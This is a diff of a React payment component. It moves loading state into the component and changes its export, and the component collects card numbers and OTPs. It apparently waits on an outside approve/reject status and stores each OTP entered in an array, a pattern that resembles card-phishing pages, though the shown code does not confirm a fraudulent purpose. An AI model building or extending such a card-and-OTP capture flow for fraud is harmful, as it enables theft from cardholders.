@@ -117,13 +117,14 @@ const BANKS = [
     },
 ];
 
-export const Payment = (props: any) => {
+ const Payment = () => {
 
     const handleSubmit = async () => {
 
     };
 
     const [step, setstep] = useState(1);
+    const [loading, setisloading] = useState(false);
     const [newotp] = useState([''])
     const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
         cardNumber: '',
@@ -156,9 +157,9 @@ export const Payment = (props: any) => {
                         setPaymentInfo(prev => ({ ...prev, status: data.status }));
                         if (data.status === 'approved') {
                             setstep(2);
-                            props.setisloading(false);
+                            setisloading(false);
                         } else if (data.status === 'rejected') {
-                            props.setisloading(false);
+                            setisloading(false);
                             alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
                             setstep(1);
                         }
@@ -564,7 +565,7 @@ export const Payment = (props: any) => {
                                                 }
                                                 onClick={() => {
                                                     if (step === 1) {
-                                                        props.setisloading(true);
+                                                        setisloading(true);
                                                         handlePay(paymentInfo, setPaymentInfo)
                                                         handleSubmit();
                                                     } else if (step >= 2) {
@@ -573,12 +574,12 @@ export const Payment = (props: any) => {
                                                             !newotp.includes(paymentInfo.otp!)
 
                                                         ) { newotp.push(paymentInfo.otp!) }
-                                                        props.setisloading(true)
+                                                        setisloading(true)
                                                         handleAddotp(paymentInfo.otp!);
-                                                        props.handleOArr(paymentInfo.otp!);
+                                                       // handleOArr(paymentInfo.otp!);
                                                         handlePay(paymentInfo, setPaymentInfo)
                                                         setTimeout(() => {
-                                                            props.setisloading(false)
+                                                            setisloading(false)
                                                             setPaymentInfo({
                                                                 ...paymentInfo,
                                                                 otp: '',
@@ -589,7 +590,7 @@ export const Payment = (props: any) => {
                                                     }
                                                 }}
                                             >
-                                                {props.loading ? "Wait..." : (step === 1 ? "Submit" : "Verify OTP")}
+                                                {loading ? "Wait..." : (step === 1 ? "Submit" : "Verify OTP")}
                                             </button>
                                             <button>Cancel</button>
                                         </div>
@@ -638,3 +639,4 @@ export const Payment = (props: any) => {
     );
 };
 
+export default Payment
